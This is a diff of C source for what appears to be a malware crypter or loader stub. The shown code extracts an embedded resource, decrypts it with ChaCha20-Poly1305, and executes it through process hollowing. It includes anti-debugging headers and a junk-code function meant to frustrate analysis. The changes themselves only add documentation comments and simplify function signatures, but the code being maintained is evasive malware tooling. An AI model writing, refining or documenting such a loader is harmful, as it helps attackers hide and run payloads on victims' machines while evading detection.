@@ -7,6 +7,9 @@
 #include "headers/injection.h"
 #include "headers/anti_debug.h"
 
+/**
+ * @brief Extracts an embedded resource from the executable.
+ */
 static unsigned char* GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
 {
     HGLOBAL hResData;
@@ -26,7 +29,10 @@ static unsigned char* GetResource(int resourceId, char* resourceType, unsigned l
     return NULL;
 }
 
-static void CleanupResources(Resources* res, CryptoContext* crypto, uint8_t* decrypted, unsigned long payloadSize)
+/**
+ * @brief Securely cleans up resources and sensitive data.
+ */
+static void CleanupResources(CryptoContext* crypto, uint8_t* decrypted, unsigned long payloadSize)
 {
     if (crypto)
     {
@@ -41,7 +47,9 @@ static void CleanupResources(Resources* res, CryptoContext* crypto, uint8_t* dec
     }
 }
 
-//does nothing useful
+/**
+ * @brief Add junk-code (does nothing useful)
+ */
 static int AddJunkCode()
 {
     __asm__ __volatile__ (
@@ -137,14 +145,14 @@ int main()
     chacha20poly1305_decrypt(&decCtx, decrypted, decrypted, res.payloadSize);
 
     // Process hollowing and execution
-    int result = ProcessHollowing(decrypted, res.payloadSize);
+    int result = ProcessHollowing(decrypted);
     if (result == 0)
     {
-        CleanupResources(&res, &crypto, decrypted, res.payloadSize);
+        CleanupResources(&crypto, decrypted, res.payloadSize);
         return 0;
     }
 
 cleanup:
-    CleanupResources(&res, &crypto, decrypted, res.payloadSize);
+    CleanupResources(&crypto, decrypted, res.payloadSize);
     return 1;
 }
